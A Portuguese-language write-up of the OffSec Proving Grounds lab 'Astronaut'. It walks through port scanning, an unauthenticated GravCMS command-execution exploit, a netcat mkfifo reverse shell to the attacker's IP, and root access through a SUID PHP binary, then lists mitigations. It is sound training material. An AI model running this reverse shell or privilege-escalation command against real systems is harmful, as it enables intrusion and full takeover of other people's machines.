---
title:     "OffSec Proving Grounds - Astronaut"
tags: [linux,easy,GravCMS]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/4c499d55-4cfe-4ead-9c9c-49d20cf32aaa)

## Enumeration

### Varredura Inicial com Nmap

Para iniciar a enumeração da máquina "Astronaut", foi realizada uma varredura completa de portas utilizando o `nmap`, com o objetivo de identificar todas as portas abertas.

```
nmap -T4 -p- -Pn 192.168.188.12 -oN nmap-all-ports.log -v
```

**Detalhes do Comando:**

- `-T4`: Ajusta a velocidade da varredura para um nível agressivo.
- `-p-`: Varre todas as 65535 portas TCP disponíveis.
- `-Pn`: Ignora a verificação de host ativo, presumindo que o alvo está acessível.
- `192.168.188.12`: IP da máquina alvo "Astronaut".
- `-oN nmap-all-ports.log`: Salva os resultados da varredura em um arquivo de log nomeado `nmap-all-ports.log`.
- `-v`: Ativa o modo verbose para maior detalhamento durante a execução.

### Varredura Adicional com NmapAutomator

Além da varredura inicial com `nmap`, utilizamos o script `nmapAutomator` para realizar uma enumeração mais abrangente, cobrindo todos os tipos de varredura suportados pelo script.

```
nmapAutomator.sh -H 192.168.188.12 -t All -o nmapautomator.log
```

**Detalhes do Comando:**

- `-H 192.168.188.12`: Define o alvo para a varredura como o IP 192.168.188.12.
- `-t All`: Executa todos os tipos de varredura disponíveis, incluindo descoberta de portas, serviços, scripts e vulnerabilidades.
- `-o nmapautomator.log`: Salva os resultados em um arquivo de log nomeado `nmapautomator.log`.

### Resultados da Enumeração

Os resultados dessas varreduras fornecerão um panorama detalhado dos serviços e portas abertas na máquina "Astronaut". Com essas informações em mãos, podemos prosseguir para identificar potenciais vetores de ataque e vulnerabilidades.

![image](https://github.com/user-attachments/assets/41c420eb-01a0-4960-a316-a9da803e5e34)

Conforme mostrado na imagem, identificamos as portas 80 e 22 abertas. Ao acessar a porta 80 via navegador, encontramos um CMS chamado GravCMS.

## Exploitation

Usando o Searchsploit, disponível por padrão no Kali, encontramos uma exploração interessante. Como não tínhamos credenciais de login, optamos por usar a exploração não autenticada, que parecia ser a mais adequada. Ao testar inicialmente, obtivemos sucesso, conseguindo executar comandos remotamente. No entanto, antes disso, foi necessário ajustar o exploit para o nosso ambiente. Após realizar os ajustes, utilizei o comando ping na máquina remota enquanto monitorava o tráfego com tcpdump na minha máquina local. Quando executei o exploit, verifiquei que a exploração foi bem-sucedida.

![image](https://github.com/user-attachments/assets/78fc4ebf-6289-4e0f-b1ee-6a65953ff32a)

```
echo -ne "ping -c 10 192.168.45.184" | base64 -w0
```

![image](https://github.com/user-attachments/assets/a8a751e3-4530-4624-88cd-44cd4f7e3806)


Sabendo que o exploit estava funcionando perfeitamente para a execução de comandos, encodei uma reverse shell em base64 de acordo com o exploit. 

A reverse shell foi a seguinte:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.184 443 >/tmp/f
```

![image](https://github.com/user-attachments/assets/7021b890-a792-4f79-9e06-b387bf8718e5)

Após a codificação e execução, consegui obter um reverse shell na máquina alvo com sucesso, confirmando a vulnerabilidade e a execução remota de comandos.

Para mais informações sobre diferentes técnicas de reverse shell, você pode consultar o [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) da Pentest Monkey.

## Privilege Escalation

Na etapa de escalonamento de privilégios, encontrei algumas complicações, não pela falta de conhecimento, mas devido a bugs na própria máquina. Passei algumas horas enumerando manualmente e utilizando ferramentas como linenum.sh e linpeas.sh.

Minha teoria sobre isso é que, se você obtém uma reverse shell e executa imediatamente essas ferramentas automáticas de enumeração, o vetor de ataque que deveria ser explorado pode desaparecer. Somente depois de reiniciar a máquina e realizar a enumeração manualmente é que o processo de escalonamento de privilégios parece funcionar corretamente, permitindo finalmente a obtenção de acesso root.

Essa situação sugere que, em algumas máquinas vulneráveis, os scripts automáticos podem, por algum motivo, interferir na exploração adequada dos vetores de ataque, tornando a abordagem manual mais eficaz em certos cenários.

Usando o comando `find / -perm -u=s -type f 2>/dev/null`, descobrimos que o arquivo `/usr/bin/php7.4` estava com o *setuid* habilitado, o que indica que ele pode ser executado com privilégios elevados (no caso, como root).

Consultando o site [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid), encontramos um método de escalonamento de privilégios que utiliza o PHP com *setuid* para obter acesso root. O PHP pode ser explorado de forma a executar comandos arbitrários com privilégios elevados, já que o binário está com o bit SUID ativo.

No caso específico do `php7.4`, utilizamos o seguinte comando baseado na documentação do GTFOBins:

```
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

Isso nos permitiu escalar os privilégios e obter acesso root na máquina. O importante aqui é que, ao habilitar o *setuid* em um binário como o PHP, ele se torna uma vulnerabilidade grave, pois permite que qualquer usuário regular execute comandos como superusuário. 

Esta etapa foi fundamental para conseguir o controle total do sistema e completar a exploração.

![image](https://github.com/user-attachments/assets/9e7a2300-b142-496e-a362-4c31e7d605a8)

## Privilege Escalation Techniques

Durante a fase de escalonamento de privilégios em uma auditoria de segurança, várias técnicas e comandos são usados para identificar potenciais falhas de configuração ou vulnerabilidades que possam ser exploradas. Aqui estão alguns dos principais comandos que você pode utilizar para encontrar e explorar vetores de ataque para escalonamento de privilégios:

### Comandos de Verificação:

- `cat /etc/apache2/apache2.conf`: Exibe o conteúdo do arquivo de configuração do Apache, o que pode revelar credenciais ou configurações inseguras.
  
- `ls -alh /var/spool/cron`: Verifica as tarefas cron armazenadas, que podem ser manipuladas para executar comandos com privilégios elevados.

- `ls -al /etc/cron*`: Exibe os cron jobs e permissões, permitindo avaliar se há vulnerabilidades nos scripts de automação do sistema.

- `ls -la /`: Lista os arquivos e diretórios na raiz do sistema, permitindo identificar arquivos com permissões incorretas que possam ser usados para escalonamento.

- `cat ~/.mysql_history`, `cat ~/.bash_history`, `cat ~/.php_history`: Verifica os históricos de comandos do MySQL, Bash e PHP, que podem conter credenciais ou comandos exploráveis.

- `cat /etc/httpd/logs/access.log`, `cat /var/log/apache2/access.log`: Exibe os logs de acesso do Apache, úteis para detectar padrões de exploração e acessos não autorizados.

- `find / -perm -1000 -type d 2>/dev/null`: Procura por diretórios com o *sticky bit*, que podem ser explorados para o controle de arquivos.

- `find / -perm -g=s -type f 2>/dev/null`: Busca arquivos com bit SUID ou SGID, que podem ser explorados para escalonamento de privilégios.

- `find / -perm -u=s -type f 2>/dev/null`: Pesquisa arquivos SUID, que permitem a execução de binários com privilégios do usuário root, se mal configurados.

Esses comandos são fundamentais para uma análise de privilege escalation, buscando permissões incorretas, vulnerabilidades em binários SUID, tarefas agendadas mal configuradas, e arquivos de log que possam conter evidências de explorações passadas.

## Mitigação dos Problemas Encontrados

### 1. **Acesso inicial e exploração do CMS Grav**
   - **Mitigação**: 
     - **Manter o CMS atualizado**: É crucial que o Grav e seus plugins sejam mantidos sempre atualizados, para evitar a exploração de vulnerabilidades conhecidas.
     - **Configuração de permissões de arquivos**: Revise as permissões de arquivos e pastas, assegurando que somente os usuários necessários tenham acesso de escrita a diretórios sensíveis.
     - **Autenticação forte**: Use autenticação multifator (MFA) para proteger o acesso ao painel administrativo e outras áreas críticas.

### 2. **Exploração do CMS com exploit não autenticado**
   - **Mitigação**:
     - **Validação de entradas**: Implementar verificações rigorosas nas entradas de dados no CMS pode prevenir injeções de comando.
     - **Desabilitar funcionalidades desnecessárias**: Se o sistema não precisa de certas funcionalidades (ex.: execução de comandos), desative-as para reduzir a superfície de ataque.
     - **Aplicar segurança no servidor web**: Configurar um WAF (Web Application Firewall) para bloquear tentativas de exploits conhecidos.

### 3. **Obtenção de reverse shell**
   - **Mitigação**:
     - **Monitoramento contínuo**: Utilize sistemas de detecção de intrusões (IDS) como o Wazuh para monitorar o tráfego de rede e identificar atividades suspeitas.
     - **Restringir uso de ferramentas de rede**: Ferramentas como `nc` (Netcat) devem ser desativadas ou configuradas com restrições em ambientes de produção.
     - **Desabilitar portas desnecessárias**: Limite a exposição de portas e serviços críticos, restringindo o acesso a serviços como SSH e Netcat.

### 4. **Escalonamento de privilégios usando PHP SUID**
   - **Mitigação**:
     - **Remover o bit SUID**: O PHP raramente precisa ter o bit SUID habilitado. Remover essa configuração pode reduzir riscos de escalonamento de privilégios.
     - **Verificar permissões de arquivos executáveis**: Realize auditorias regulares no sistema para identificar e corrigir permissões de arquivos executáveis que podem representar risco.
     - **Limitar o uso de scripts como root**: Se for necessário executar scripts com privilégios elevados, isso deve ser feito de forma controlada com ferramentas como `sudo` e regras restritivas.

### 5. **Instabilidade durante exploração de escalonamento de privilégio**
   - **Mitigação**:
     - **Criação de snapshots**: Antes de realizar qualquer alteração ou exploração no ambiente, crie snapshots ou backups para facilitar a restauração ao estado original.
     - **Ambiente de teste dedicado**: Realize testes de segurança em ambientes isolados que espelhem o ambiente de produção, sem impactar diretamente o ambiente em uso.
